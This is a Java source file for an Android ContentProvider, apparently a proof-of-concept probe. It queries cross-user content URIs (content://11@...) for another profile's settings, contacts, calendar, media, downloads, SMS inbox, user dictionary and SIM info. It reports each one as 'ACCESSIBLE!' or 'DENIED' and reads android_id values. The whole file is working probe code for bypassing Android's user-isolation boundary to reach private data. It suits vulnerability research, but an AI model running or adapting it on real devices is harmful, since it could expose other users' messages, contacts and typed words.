package com.poc.crossuser;

import android.content.ContentProvider;
import android.content.ContentValues;
import android.content.ContentResolver;
import android.database.Cursor;
import android.database.MatrixCursor;
import android.net.Uri;
import android.os.IBinder;
import android.os.Parcel;
import java.lang.reflect.Method;

public class CrossUserURIProvider extends ContentProvider {

    @Override
    public boolean onCreate() { return true; }

    @Override
    public Cursor query(Uri uri, String[] proj, String sel, String[] selArgs, String sort) {
        MatrixCursor cursor = new MatrixCursor(new String[]{"test", "result"});
        cursor.addRow(new Object[]{"uid", String.valueOf(android.os.Process.myUid())});

        ContentResolver cr = getContext().getContentResolver();

        // Cross-user URI format: content://userId@authority/path
        // Test if any providers accept cross-user URIs from app context

        // Test 1: Settings provider cross-user
        cursor.addRow(new Object[]{"=== Settings @11 ===", ""});
        String[] settingsUris = {
            "content://11@settings/secure/android_id",
            "content://11@settings/global/device_name",
            "content://11@settings/secure/default_input_method",
        };
        for (String uriStr : settingsUris) {
            try {
                Uri u = Uri.parse(uriStr);
                Cursor c = cr.query(u, null, null, null, null);
                if (c != null) {
                    int count = c.getCount();
                    if (count > 0 && c.moveToFirst()) {
                        String val = c.getString(c.getColumnIndex("value"));
                        cursor.addRow(new Object[]{"set11_" + u.getLastPathSegment(),
                            "CROSS-USER! val=" + truncate(val)});
                    } else {
                        cursor.addRow(new Object[]{"set11_" + u.getLastPathSegment(), "count=" + count});
                    }
                    c.close();
                }
            } catch (SecurityException e) {
                cursor.addRow(new Object[]{"set11_" + Uri.parse(uriStr).getLastPathSegment(),
                    "DENIED:" + truncate(e.getMessage())});
            } catch (Exception e) {
                cursor.addRow(new Object[]{"set11_" + Uri.parse(uriStr).getLastPathSegment(),
                    "ERR:" + truncate(e.getMessage())});
            }
        }

        // Test 2: Contacts provider cross-user
        cursor.addRow(new Object[]{"=== Contacts @11 ===", ""});
        String[] contactUris = {
            "content://11@com.android.contacts/contacts",
            "content://11@com.android.contacts/raw_contacts",
            "content://11@contacts/people",
        };
        for (String uriStr : contactUris) {
            try {
                Uri u = Uri.parse(uriStr);
                Cursor c = cr.query(u, null, null, null, null);
                if (c != null) {
                    cursor.addRow(new Object[]{"cont11_" + u.getLastPathSegment(),
                        "ACCESSIBLE! count=" + c.getCount()});
                    c.close();
                } else {
                    cursor.addRow(new Object[]{"cont11_" + u.getLastPathSegment(), "null cursor"});
                }
            } catch (SecurityException e) {
                cursor.addRow(new Object[]{"cont11_" + Uri.parse(uriStr).getLastPathSegment(),
                    "DENIED:" + truncate(e.getMessage())});
            } catch (Exception e) {
                cursor.addRow(new Object[]{"cont11_" + Uri.parse(uriStr).getLastPathSegment(),
                    "ERR:" + truncate(e.getMessage())});
            }
        }

        // Test 3: Calendar provider cross-user
        cursor.addRow(new Object[]{"=== Calendar @11 ===", ""});
        try {
            Uri u = Uri.parse("content://11@com.android.calendar/calendars");
            Cursor c = cr.query(u, null, null, null, null);
            if (c != null) {
                cursor.addRow(new Object[]{"cal11", "ACCESSIBLE! count=" + c.getCount()});
                c.close();
            }
        } catch (SecurityException e) {
            cursor.addRow(new Object[]{"cal11", "DENIED:" + truncate(e.getMessage())});
        } catch (Exception e) {
            cursor.addRow(new Object[]{"cal11", "ERR:" + truncate(e.getMessage())});
        }

        // Test 4: MediaStore cross-user
        cursor.addRow(new Object[]{"=== MediaStore @11 ===", ""});
        String[] mediaUris = {
            "content://11@media/external/images/media",
            "content://11@media/external/video/media",
            "content://11@media/external/audio/media",
        };
        for (String uriStr : mediaUris) {
            try {
                Uri u = Uri.parse(uriStr);
                Cursor c = cr.query(u, null, null, null, null);
                if (c != null) {
                    cursor.addRow(new Object[]{"media11_" + u.getLastPathSegment(),
                        "ACCESSIBLE! count=" + c.getCount()});
                    c.close();
                }
            } catch (SecurityException e) {
                cursor.addRow(new Object[]{"media11_" + Uri.parse(uriStr).getLastPathSegment(),
                    "DENIED:" + truncate(e.getMessage())});
            } catch (Exception e) {
                cursor.addRow(new Object[]{"media11_" + Uri.parse(uriStr).getLastPathSegment(),
                    "ERR:" + truncate(e.getMessage())});
            }
        }

        // Test 5: Downloads provider cross-user
        cursor.addRow(new Object[]{"=== Downloads @11 ===", ""});
        try {
            Uri u = Uri.parse("content://11@downloads/all_downloads");
            Cursor c = cr.query(u, null, null, null, null);
            if (c != null) {
                cursor.addRow(new Object[]{"dl11", "ACCESSIBLE! count=" + c.getCount()});
                c.close();
            }
        } catch (SecurityException e) {
            cursor.addRow(new Object[]{"dl11", "DENIED:" + truncate(e.getMessage())});
        } catch (Exception e) {
            cursor.addRow(new Object[]{"dl11", "ERR:" + truncate(e.getMessage())});
        }

        // Test 6: SMS/MMS cross-user
        cursor.addRow(new Object[]{"=== SMS @11 ===", ""});
        try {
            Uri u = Uri.parse("content://11@sms/inbox");
            Cursor c = cr.query(u, null, null, null, null);
            if (c != null) {
                cursor.addRow(new Object[]{"sms11", "ACCESSIBLE! count=" + c.getCount()});
                c.close();
            }
        } catch (SecurityException e) {
            cursor.addRow(new Object[]{"sms11", "DENIED:" + truncate(e.getMessage())});
        } catch (Exception e) {
            cursor.addRow(new Object[]{"sms11", "ERR:" + truncate(e.getMessage())});
        }

        // Test 7: User dictionary cross-user (sensitive — can reveal typed words)
        cursor.addRow(new Object[]{"=== UserDictionary @11 ===", ""});
        try {
            Uri u = Uri.parse("content://11@user_dictionary/words");
            Cursor c = cr.query(u, null, null, null, null);
            if (c != null) {
                cursor.addRow(new Object[]{"dict11", "ACCESSIBLE! count=" + c.getCount()});
                c.close();
            }
        } catch (SecurityException e) {
            cursor.addRow(new Object[]{"dict11", "DENIED:" + truncate(e.getMessage())});
        } catch (Exception e) {
            cursor.addRow(new Object[]{"dict11", "ERR:" + truncate(e.getMessage())});
        }

        // Test 8: Also try the cross-user with user 0 (from our context)
        // to establish baseline
        cursor.addRow(new Object[]{"=== Baseline @0 ===", ""});
        try {
            Uri u = Uri.parse("content://0@settings/secure/android_id");
            Cursor c = cr.query(u, null, null, null, null);
            if (c != null && c.moveToFirst()) {
                String val = c.getString(c.getColumnIndex("value"));
                cursor.addRow(new Object[]{"set0_androidid", "val=" + truncate(val)});
                c.close();
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"set0_androidid", "ERR:" + truncate(e.getMessage())});
        }

        // Test 9: ContentProviderClient with cross-user URI
        // Some providers have special handling for the userId prefix
        cursor.addRow(new Object[]{"=== SliceProvider @11 ===", ""});
        try {
            Uri u = Uri.parse("content://11@com.android.settings.slices/action/bluetooth");
            Cursor c = cr.query(u, null, null, null, null);
            if (c != null) {
                cursor.addRow(new Object[]{"slice11", "ACCESSIBLE! count=" + c.getCount()});
                c.close();
            }
        } catch (SecurityException e) {
            cursor.addRow(new Object[]{"slice11", "DENIED:" + truncate(e.getMessage())});
        } catch (Exception e) {
            cursor.addRow(new Object[]{"slice11", "ERR:" + truncate(e.getMessage())});
        }

        // Test 10: Telephony provider cross-user
        cursor.addRow(new Object[]{"=== Telephony @11 ===", ""});
        try {
            Uri u = Uri.parse("content://11@telephony/siminfo");
            Cursor c = cr.query(u, null, null, null, null);
            if (c != null) {
                cursor.addRow(new Object[]{"tel11_siminfo", "ACCESSIBLE! count=" + c.getCount()});
                c.close();
            }
        } catch (SecurityException e) {
            cursor.addRow(new Object[]{"tel11_siminfo", "DENIED:" + truncate(e.getMessage())});
        } catch (Exception e) {
            cursor.addRow(new Object[]{"tel11_siminfo", "ERR:" + truncate(e.getMessage())});
        }

        return cursor;
    }

    private String truncate(String s) {
        if (s == null) return "null";
        return s.length() > 120 ? s.substring(0, 120) : s;
    }

    @Override public String getType(Uri uri) { return null; }
    @Override public Uri insert(Uri uri, ContentValues values) { return null; }
    @Override public int delete(Uri uri, String sel, String[] selArgs) { return 0; }
    @Override public int update(Uri uri, ContentValues values, String sel, String[] selArgs) { return 0; }
}
